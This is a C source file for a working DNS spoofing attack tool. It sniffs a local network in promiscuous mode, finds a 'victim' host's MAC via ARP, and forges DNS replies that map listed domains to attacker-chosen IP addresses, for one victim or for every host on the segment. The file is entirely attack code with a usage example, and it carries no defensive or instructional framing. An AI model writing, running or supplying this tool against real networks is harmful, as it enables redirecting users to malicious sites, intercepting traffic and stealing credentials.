#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <errno.h>

#define GREEN "\033[92m"
#define WARNING "\033[93m"
#define ENDC "\033[0m"

#define MAX_ENTRIES 100
#define MAX_LINE 256
#define DNS_PORT 53
#define BUFFER_SIZE 65535

struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

struct dns_rr {
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
} __attribute__((packed));

struct arp_packet {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t sender_mac[ETH_ALEN];
    uint8_t sender_ip[4];
    uint8_t target_mac[ETH_ALEN];
    uint8_t target_ip[4];
};

char local_ip[INET_ADDRSTRLEN];
char victim_ip[INET_ADDRSTRLEN];
unsigned char local_mac[ETH_ALEN];  // MAC của attacker
unsigned char victim_mac[ETH_ALEN]; // MAC của victim
int spoof_all = 0;
int raw_sock;
int recv_sock;
char interface[IFNAMSIZ];

struct {
    char domain[256];
    char ip[INET_ADDRSTRLEN];
} records[MAX_ENTRIES];
int record_count = 0;

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short udp_checksum(struct ip *iph, struct udphdr *udph, char *payload, int payload_len) {
    unsigned long sum = 0;
    unsigned short *buf;
    int len = ntohs(udph->len);

    sum += (iph->ip_src.s_addr & 0xffff) + (iph->ip_src.s_addr >> 16);
    sum += (iph->ip_dst.s_addr & 0xffff) + (iph->ip_dst.s_addr >> 16);
    sum += htons(IPPROTO_UDP);
    sum += udph->len;

    buf = (unsigned short*)udph;
    for (int i = 0; i < 4; i++) sum += buf[i];

    buf = (unsigned short*)payload;
    while (payload_len > 1) {
        sum += *buf++;
        payload_len -= 2;
    }
    if (payload_len == 1) sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int is_valid_ip(const char *ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

void get_local_ip(const char *ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("Cannot create socket for getting IP");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("Cannot get interface address");
        close(fd);
        exit(1);
    }

    struct sockaddr_in *sin = (struct sockaddr_in*)&ifr.ifr_addr;
    inet_ntop(AF_INET, &sin->sin_addr, local_ip, INET_ADDRSTRLEN);
    close(fd);
}

void get_local_mac(const char *ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("Cannot create socket for getting MAC");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Cannot get interface MAC");
        close(fd);
        exit(1);
    }

    memcpy(local_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("Local MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           local_mac[0], local_mac[1], local_mac[2],
           local_mac[3], local_mac[4], local_mac[5]);
    close(fd);
}

int read_records(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Cannot open file: %s\n", filename);
        return 0;
    }
    
    char line[MAX_LINE];
    record_count = 0;
    while (fgets(line, sizeof(line), file)) {
        if (record_count >= MAX_ENTRIES) break;
        if (line[0] == '\n' || line[0] == '\r') continue;
        
        char domain[256], ip[INET_ADDRSTRLEN];
        if (sscanf(line, "%255s %15s", domain, ip) == 2) {
            if (!is_valid_ip(ip)) {
                printf("Invalid IP address in file: %s\n", ip);
                fclose(file);
                return 0;
            }
            strcpy(records[record_count].domain, domain);
            strcpy(records[record_count].ip, ip);
            record_count++;
        } else {
            printf("Invalid line format in file: %s", line);
            fclose(file);
            return 0;
        }
    }
    fclose(file);
    return record_count > 0;
}

void encode_domain_name(const char *domain, char *encoded) {
    int i = 0, j = 0;
    while (domain[i]) {
        int len = 0;
        while (domain[i + len] && domain[i + len] != '.') len++;
        encoded[j++] = len;
        memcpy(encoded + j, domain + i, len);
        j += len;
        i += len;
        if (domain[i] == '.') i++;
    }
    encoded[j++] = 0;
}

unsigned char* get_victim_mac(int sock, const char *victim_ip_str) {
    char buffer[1500];
    struct ethhdr *eth = (struct ethhdr*)buffer;
    struct arp_packet *arp = (struct arp_packet*)(buffer + sizeof(struct ethhdr));

    arp->hardware_type = htons(1);
    arp->protocol_type = htons(ETH_P_IP);
    arp->hardware_len = ETH_ALEN;
    arp->protocol_len = 4;
    arp->opcode = htons(1); // ARP Request
    memcpy(arp->sender_mac, local_mac, ETH_ALEN);
    inet_pton(AF_INET, local_ip, arp->sender_ip);
    memset(arp->target_mac, 0, ETH_ALEN);
    inet_pton(AF_INET, victim_ip_str, arp->target_ip);

    unsigned char broadcast_mac[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(eth->h_dest, broadcast_mac, ETH_ALEN);
    memcpy(eth->h_source, local_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(interface);
    sll.sll_halen = ETH_ALEN;
    memcpy(sll.sll_addr, broadcast_mac, ETH_ALEN);

    if (sendto(sock, buffer, sizeof(struct ethhdr) + sizeof(struct arp_packet), 0, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("Failed to send ARP request");
        return NULL;
    }

    while (1) {
        int len = recv(sock, buffer, sizeof(buffer), 0);
        if (len < 0) {
            perror("Failed to receive ARP reply");
            return NULL;
        }
        if (ntohs(eth->h_proto) == ETH_P_ARP && ntohs(arp->opcode) == 2) {
            char sender_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, arp->sender_ip, sender_ip, INET_ADDRSTRLEN);
            if (strcmp(sender_ip, victim_ip_str) == 0) {
                memcpy(victim_mac, arp->sender_mac, ETH_ALEN);
                printf("Victim MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                       victim_mac[0], victim_mac[1], victim_mac[2],
                       victim_mac[3], victim_mac[4], victim_mac[5]);
                return victim_mac;
            }
        }
    }
    return NULL;
}

void send_spoofed_response(struct ip *iph, struct udphdr *udph, struct dns_header *dnsh, char *qname, const char *fake_ip) {
    char packet[1500];
    memset(packet, 0, sizeof(packet));

    int qname_len = strlen(qname) + 2;
    int dns_payload_len = sizeof(struct dns_header) + qname_len + sizeof(struct dns_question) + 
                          2 /* con trỏ */ + sizeof(struct dns_rr) + 4 /* IP */;
    int udp_len = sizeof(struct udphdr) + dns_payload_len;
    int ip_len = sizeof(struct ip) + udp_len;
    int eth_len = sizeof(struct ethhdr) + ip_len;

    struct ethhdr *eth_out = (struct ethhdr*)packet;
    memcpy(eth_out->h_dest, victim_mac, ETH_ALEN);
    memcpy(eth_out->h_source, local_mac, ETH_ALEN);
    eth_out->h_proto = htons(ETH_P_IP);

    struct ip *iph_out = (struct ip*)(packet + sizeof(struct ethhdr));
    iph_out->ip_v = 4;
    iph_out->ip_hl = 5;
    iph_out->ip_tos = 0;
    iph_out->ip_len = htons(ip_len);
    iph_out->ip_id = htons(rand());
    iph_out->ip_off = 0;
    iph_out->ip_ttl = 64;
    iph_out->ip_p = IPPROTO_UDP;
    iph_out->ip_src = iph->ip_dst; // Nguồn là DNS server victim gửi tới
    iph_out->ip_dst = iph->ip_src; // Đích là victim
    iph_out->ip_sum = checksum((unsigned short*)iph_out, sizeof(struct ip));

    struct udphdr *udph_out = (struct udphdr*)(packet + sizeof(struct ethhdr) + sizeof(struct ip));
    udph_out->source = htons(DNS_PORT);
    udph_out->dest = udph->source;
    udph_out->len = htons(udp_len);
    udph_out->check = 0;

    struct dns_header *dnsh_out = (struct dns_header*)(packet + sizeof(struct ethhdr) + sizeof(struct ip) + sizeof(struct udphdr));
    dnsh_out->id = dnsh->id;
    dnsh_out->flags = htons(0x8180);
    dnsh_out->qdcount = htons(1);
    dnsh_out->ancount = htons(1);
    dnsh_out->nscount = 0;
    dnsh_out->arcount = 0;

    char *qname_out = (char*)(packet + sizeof(struct ethhdr) + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(struct dns_header));
    encode_domain_name(qname, qname_out);
    struct dns_question *qst = (struct dns_question*)(qname_out + qname_len);
    qst->qtype = htons(1);
    qst->qclass = htons(1);

    char *answer_start = (char*)qst + sizeof(struct dns_question);
    *((uint16_t*)answer_start) = htons(0xc00c);
    struct dns_rr *rr = (struct dns_rr*)(answer_start + 2);
    rr->type = htons(1);
    rr->class = htons(1);
    rr->ttl = htonl(3600);
    rr->rdlength = htons(4);
    char *rdata = (char*)rr + sizeof(struct dns_rr);
    inet_pton(AF_INET, fake_ip, rdata);

    udph_out->check = udp_checksum(iph_out, udph_out, (char*)dnsh_out, dns_payload_len);

    printf("Sending spoofed response to %s from %s for %s (ID: %d)\n",
           inet_ntoa(iph_out->ip_dst), inet_ntoa(iph_out->ip_src), qname, ntohs(dnsh_out->id));

    struct sockaddr_ll dest;
    memset(&dest, 0, sizeof(dest));
    dest.sll_family = AF_PACKET;
    dest.sll_ifindex = if_nametoindex(interface);
    dest.sll_halen = ETH_ALEN;
    memcpy(dest.sll_addr, victim_mac, ETH_ALEN);

    int sent_bytes = sendto(raw_sock, packet, eth_len, 0, (struct sockaddr*)&dest, sizeof(dest));
    if (sent_bytes < 0) {
        perror("Failed to send packet");
        printf("Error code: %d\n", errno);
    }
}

void process_packet(char *buffer, int len) {
    if (len < sizeof(struct ethhdr) + sizeof(struct ip)) return;

    struct ethhdr *eth = (struct ethhdr*)buffer;
    if (ntohs(eth->h_proto) != ETH_P_IP) return;

    struct ip *iph = (struct ip*)(buffer + sizeof(struct ethhdr));
    int ip_hdr_len = iph->ip_hl * 4;

    if (iph->ip_p != IPPROTO_UDP) return;

    if (len < sizeof(struct ethhdr) + ip_hdr_len + sizeof(struct udphdr)) return;

    struct udphdr *udph = (struct udphdr*)(buffer + sizeof(struct ethhdr) + ip_hdr_len);
    if (ntohs(udph->dest) != DNS_PORT) return;

    struct dns_header *dnsh = (struct dns_header*)(buffer + sizeof(struct ethhdr) + ip_hdr_len + sizeof(struct udphdr));
    if (strcmp(inet_ntoa(iph->ip_src), local_ip) == 0) return;
    if (!spoof_all && strcmp(inet_ntoa(iph->ip_src), victim_ip) != 0) return;
    if (ntohs(dnsh->qdcount) != 1 || ntohs(dnsh->ancount) != 0) return;

    char *qname = (char*)(buffer + sizeof(struct ethhdr) + ip_hdr_len + sizeof(struct udphdr) + sizeof(struct dns_header));
    char domain[256];
    int i, j = 0;
    for (i = 0; qname[i] && j < sizeof(domain) - 2; i += qname[i] + 1) {
        for (int k = 0; k < qname[i] && j < sizeof(domain) - 2; k++) {
            domain[j++] = qname[i + k + 1];
        }
        domain[j++] = '.';
    }
    if (j > 0) domain[j - 1] = '\0';
    else domain[0] = '\0';

    printf("Received DNS query from %s for %s\n", inet_ntoa(iph->ip_src), domain);

    for (i = 0; i < record_count; i++) {
        if (strcmp(domain, records[i].domain) == 0) {
            send_spoofed_response(iph, udph, dnsh, domain, records[i].ip);
            printf(GREEN "[#] Spoofed %s to %s for %s\n" ENDC, domain, records[i].ip, inet_ntoa(iph->ip_src));
            return;
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <interface> <victim_ip/all> <records_file>\n", argv[0]);
        printf("Example: %s eth0 192.168.10.57 record.txt\n", argv[0]);
        return 1;
    }

    strncpy(interface, argv[1], IFNAMSIZ - 1);
    srand(time(NULL));

    raw_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_sock < 0) {
        perror("Cannot create raw socket for sending");
        return 1;
    }

    recv_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (recv_sock < 0) {
        perror("Cannot create raw socket for receiving");
        return 1;
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex(interface);
    if (sll.sll_ifindex == 0) {
        perror("Invalid interface");
        close(raw_sock);
        close(recv_sock);
        return 1;
    }
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(recv_sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("Cannot bind socket to interface");
        close(raw_sock);
        close(recv_sock);
        return 1;
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    if (ioctl(recv_sock, SIOCGIFFLAGS, &ifr) < 0) {
        perror("Cannot get interface flags");
        close(raw_sock);
        close(recv_sock);
        return 1;
    }
    ifr.ifr_flags |= IFF_PROMISC;
    if (ioctl(recv_sock, SIOCSIFFLAGS, &ifr) < 0) {
        perror("Cannot set promiscuous mode");
        close(raw_sock);
        close(recv_sock);
        return 1;
    }

    get_local_ip(interface);
    get_local_mac(interface);
    printf("Local IP: %s\n", local_ip);

    if (strcmp(argv[2], "all") == 0) {
        spoof_all = 1;
    } else {
        strcpy(victim_ip, argv[2]);
        if (!is_valid_ip(victim_ip)) {
            printf("Invalid victim IP address\n");
            return 1;
        }
        if (!get_victim_mac(raw_sock, victim_ip)) {
            printf("Failed to get victim MAC\n");
            close(raw_sock);
            close(recv_sock);
            return 1;
        }
    }

    if (!read_records(argv[3])) {
        return 1;
    }
    printf("Loaded %d records\n", record_count);
    printf("Spoofing DNS responses...\n");

    char buffer[BUFFER_SIZE];
    while (1) {
        int len = recv(recv_sock, buffer, sizeof(buffer), 0);
        if (len < 0) {
            perror("Failed to receive packet");
            continue;
        }
        process_packet(buffer, len);
    }

    close(raw_sock);
    close(recv_sock);
    return 0;
}
